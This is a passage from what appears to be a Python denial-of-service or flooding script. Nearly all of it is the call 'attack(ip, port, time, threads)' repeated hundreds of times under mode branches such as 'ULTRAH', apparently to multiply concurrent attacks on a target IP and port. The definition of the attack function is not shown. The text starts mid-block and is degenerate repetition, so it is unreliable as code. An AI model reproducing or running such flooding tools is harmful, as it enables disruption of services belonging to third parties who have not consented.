        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
     if choice == 'ULTRAH':
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
